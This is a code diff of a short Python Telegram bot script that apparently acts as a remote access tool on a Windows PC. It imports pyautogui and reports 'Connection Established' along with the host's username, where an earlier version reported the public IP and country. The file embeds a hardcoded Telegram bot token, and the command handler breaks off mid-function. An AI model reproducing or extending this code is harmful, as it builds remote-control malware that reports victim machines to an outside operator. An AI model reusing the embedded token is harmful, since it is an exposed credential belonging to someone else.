@@ -1,18 +1,17 @@
 from telegram.ext import Updater,CommandHandler,MessageHandler,Filters
 import os
-import subprocess
-from requests import *
 import pyautogui
 
 TOKEN = "5913616404:AAFW9HlRZqCEmh3EgBe8pOfVayRiz_zxvPM"
 
-req = get("https://api.myip.com").json();
-
 def start(update,context):
-    ip = req["ip"]
-    country = req["country"];
+    username = ""
+    req = os.popen("echo %username%")
 
-    update.message.reply_text(f"Connection Established => {ip} - {country}")
+    for us in req:
+        username+= us
+
+    update.message.reply_text(f"Connection Established => {username} PC")
 
 def answer(update,context):
     testo = update.message.text.lower()
